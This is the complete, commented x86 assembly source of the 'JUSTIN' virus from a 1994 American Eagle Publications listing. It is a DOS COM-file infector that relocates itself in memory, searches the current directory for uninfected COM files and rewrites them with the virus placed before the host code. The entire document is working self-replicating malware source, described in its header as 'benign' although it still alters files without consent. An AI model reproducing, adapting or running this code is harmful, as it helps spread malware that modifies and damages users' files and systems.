;The JUSTIN virus is a parasitic COM infector which puts itself before the
;host in the file. This virus is benign
;
;(C) 1994 American Eagle Publications, Inc. All Rights Reserved!

.model small
.code
                org     0100H

JUSTIN:
                call    CHECK_MEM               ;enough memory to run?
                jc      GOTO_HOST_LOW           ;nope, just exit to host
                call    JUMP_HIGH               ;go to next 64K memory block
                call    FIND_FILE               ;find a file to infect
                jc      GOTO_HOST_HIGH          ;none available, go to host
                call    INFECT_FILE             ;infect file we found
GOTO_HOST_HIGH:
                mov     di,100H                 ;move host to low memory
                mov     si,OFFSET HOST
                mov     ax,ss                   ;ss points to low seg still
                mov     ds,ax                   ;so set ds and es to point there
                mov     es,ax
                push    ax                      ;push return address
                push    di                      ;to execute host (for later use)
                mov     cx,sp
                sub     cx,OFFSET HOST          ;cx = bytes to move
                rep     movsb                   ;move host to offset 100H
                retf                            ;and go execute it

;This executes only if Justin doesn't have enough memory to infect anything.
;It puts code to move the host down on the stack, and then jumps to it.
GOTO_HOST_LOW:
                mov     ax,100H                 ;put 100H ret addr on stack
                push    ax
                mov     ax,sp
                sub     ax,6                    ;ax=start of stack instructions
                push    ax                      ;address to jump to on stack

                mov     ax,000C3H               ;put "ret" on stack
                push    ax
                mov     ax,0A4F3H               ;put "rep movsb" on stack
                push    ax

                mov     si,OFFSET HOST          ;set up si and di
                mov     di,100H                 ;in prep to move data
                mov     cx,sp                   ;set up cx
                sub     cx,OFFSET HOST

                cli                             ;hw ints off
                add     sp,4                    ;adjust stack

                ret                             ;go to stack code


;This routine checks memory to see if there is enough room for JUSTIN to
;execute properly. If not, it returns with carry set.
CHECK_MEM:
                mov     ah,4AH                  ;modify allocated memory
                mov     bx,2000H                ;we want 2*64K
                int     21H                     ;set c if not enough memory
                pushf
                mov     ah,4AH                  ;re-allocate all available mem
                mov     bx,0FFFFH
                int     21H
                mov     ah,4AH
                int     21H
                popf
                ret                             ;and return to caller

;This routine jumps to the block 64K above where the virus starts executing.
;It also sets all segment registers to point there, and moves the DTA to
;offset 80H in that segment.
JUMP_HIGH:
                mov     ax,ds                   ;ds points to current segment
                add     ax,1000H
                mov     es,ax                   ;es points 64K higher
                mov     si,100H
                mov     di,si                   ;di = si = 100H
                mov     cx,OFFSET HOST - 100H   ;cx = bytes to move
                rep     movsb                   ;copy virus to upper 64K block
                mov     ds,ax                   ;set ds to high segment now, too
                mov     ah,1AH                  ;move DTA
                mov     dx,80H                  ;to ds:80H (high segment)
                int     21H
                pop     ax                      ;get return @ off of stack
                push    es                      ;put hi mem seg on stack
                push    ax                      ;then put return @ back
                retf                            ;FAR return to high memory!


;The following routine searches for one uninfected COM file and returns with
;c reset if one is found. It only searches the current directory.
FIND_FILE:
                mov     dx,OFFSET COM_MASK      ;search for COM files
                mov     ah,4EH                  ;DOS find first file function
                xor     cx,cx                   ;CX holds all file attributes
FIND_LOOP:      int     21H
                jc      FIND_EXIT               ;Exit if no files found
                call    FILE_OK                 ;file OK to infect?
                jc      FIND_NEXT               ;nope, look for another
FIND_EXIT:      ret                             ;else return with z set
FIND_NEXT:      mov     ah,4FH                  ;DOS find next file function
                jmp     FIND_LOOP               ;Try finding another file

COM_MASK        db      '*.COM',0               ;COM file search mask


;The following routine determines whether a file is ok to infect. There are
;several criteria which must be satisfied if a file is to be infected.
;
;       1. We must be able to write to the file (open read/write successful).
;       2. The file must not be too big.
;       3. The file must not already be infected.
;       4. The file must not really be an EXE.
;
;If these criteria are met, FILE_OK returns with c reset, the file open, with
;the handle in bx and the original size in dx. If any criteria fail, FILE_OK
;returns with c set.
FILE_OK:
                mov     dx,9EH                  ;offset of file name in DTA
                mov     ax,3D02H                ;open file, read/write access
                int     21H
                jc      FOK_EXIT_C              ;open failed, exit with c set
                mov     bx,ax                   ;else put handle in bx
                mov     ax,4202H                ;seek end of file
                xor     cx,cx                   ;displacement from end = 0
                xor     dx,dx
                int     21H                     ;dx:ax contains file size
                jc      FOK_EXIT_CCF            ;exit if it fails
                or      dx,dx                   ;if file size > 64K, exit
                jnz     FOK_EXIT_CCF            ;with c set
                mov     cx,ax                   ;put file size in cx too
                add     ax,OFFSET HOST          ;add Justin + PSP size to host
                cmp     ax,0FF00H               ;is there 100H bytes for stack?
                jnc     FOK_EXIT_C              ;nope, exit with c set
                push    cx                      ;save host size for future use
                mov     ax,4200H                ;reposition file pointer
                xor     cx,cx
                xor     dx,dx                   ;to start of file
                int     21H
                pop     cx
                push    cx
                mov     ah,3FH                  ;prepare to read file
                mov     dx,OFFSET HOST          ;into host location
                int     21H                     ;do it
                pop     dx                      ;host size now in dx
                jc      FOK_EXIT_CCF            ;exit with c set if failure
                mov     si,100H                 ;now check 20 bytes to see
                mov     di,OFFSET HOST          ;if file already infected
                mov     cx,10
                repz    cmpsw                   ;do it
                jz      FOK_EXIT_CCF            ;already infected, exit now
                cmp     WORD PTR cs:[HOST],'ZM' ;is it really an EXE?
                jz      FOK_EXIT_CCF            ;yes, exit with c set
                clc                             ;all systems go, clear carry
                ret                             ;and exit

FOK_EXIT_CCF:   mov     ah,3EH                  ;close file
                int     21H
FOK_EXIT_C:     stc                             ;set carry
                ret                             ;and return


;This routine infects the file located by FIND_FILE.
INFECT_FILE:
                push    dx                      ;save original host size
                mov     ax,4200H                ;reposition file pointer
                xor     cx,cx
                xor     dx,dx                   ;to start of file
                int     21H
                pop     cx                      ;original host size to cx
                add     cx,OFFSET HOST - 100H   ;add virus size to it
                mov     dx,100H                 ;start of infected image
                mov     ah,40H                  ;write file
                int     21H
                mov     ah,3EH                  ;and close the file
                int     21H
                ret                             ;and exit

;Here is where the host program starts. In this assembler listing, the host
;just exits to DOS.
HOST:
                mov     ax,4C00H                ;exit to DOS
                int     21H

                end     JUSTIN

